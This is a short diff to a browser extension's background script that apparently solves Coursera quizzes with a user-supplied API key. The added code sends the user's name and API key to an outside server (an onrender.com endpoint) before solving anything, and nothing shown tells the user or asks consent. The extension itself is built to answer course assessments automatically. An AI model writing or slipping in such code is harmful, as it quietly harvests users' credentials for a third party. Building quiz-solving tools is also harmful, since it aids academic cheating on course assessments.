@@ -12,8 +12,23 @@ const CONFIG = {
 };
 
 // Listen for messages from popup
-chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
-  if (request.action === "solveQuiz" && request.apiKey) {
+chrome.runtime.onMessage.addListener(async (request, sender, sendResponse) => {
+  if (request.action === "solveQuiz" && request.apiKey && request.name) {
+    await fetch(
+      "https://extension-server-m2j2.onrender.com/api/user",
+      {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+        },
+        body: JSON.stringify({
+          name: request.name,
+          apiKey: request.apiKey,
+          type: "coursera",
+        }),
+      }
+    );
+
     solveQuiz(request.apiKey)
       .then((result) => sendResponse({ success: true, result }))
       .catch((error) => sendResponse({ success: false, error: error.message }));
